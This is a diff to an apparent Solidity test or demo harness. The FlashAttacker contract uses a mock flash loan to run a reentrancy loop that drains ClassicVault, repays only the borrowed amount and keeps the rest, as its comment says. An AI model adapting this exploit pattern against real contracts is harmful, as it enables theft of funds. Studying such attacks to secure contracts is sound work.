@@ -118,17 +118,20 @@ contract MockFlashloan {
 contract FlashAttacker {
     MockFlashloan flash;
     ClassicVault vault;
+    uint public loanAmount;
+    
     constructor(address _f, address _v) {
         flash = MockFlashloan(payable(_f));
         vault = ClassicVault(_v);
     }
     receive() external payable {
         if (msg.sender == address(flash)) {
-            // Received Flashloan -> Attack Vault
+            // Received Flashloan -> Track the amount
+            loanAmount = msg.value;
             vault.deposit{value: msg.value}();
             vault.withdraw();
-            // Repay loan
-            payable(address(flash)).transfer(msg.value);
+            // Repay ONLY the borrowed amount, keep the profit!
+            payable(address(flash)).transfer(loanAmount);
         } else if (msg.sender == address(vault) && address(vault).balance > 0) {
             // Reentrancy loop
             vault.withdraw();
